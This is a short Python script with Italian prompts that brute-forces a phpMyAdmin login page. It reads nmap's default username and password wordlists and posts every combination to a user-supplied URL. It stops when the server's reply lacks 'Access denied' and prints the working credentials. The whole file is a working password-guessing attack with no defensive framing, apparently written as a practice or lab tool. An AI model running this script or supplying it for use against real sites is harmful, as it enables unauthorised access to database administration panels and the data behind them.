import requests

url = input ("Inserisci l'url del sito: ")

utente_file = open("/usr/share/nmap/nselib/data/usernames.lst","r")
password_file = open("/usr/share/nmap/nselib/data/passwords.lst","r")

utente_lista = utente_file.readlines()
password_lista = password_file.readlines()

trovato = 0

for utente in utente_lista:
    utente = utente.rstrip()
    for password in password_lista:
        password = password.rstrip()
        print(utente, "-", password)
        data = {'pma_username': utente, 'pma_password': password, 'Go': "Go"}
        invio_dati = requests.post (url, data = data)
        if not 'Access denied' in str(invio_dati.content):
            trovato = 1
        if trovato ==1:
            print ("Utente e password trovati:\n", utente, "\n", password)
            exit()
if trovato == 0:
    print ("\nCredenziali non trovate")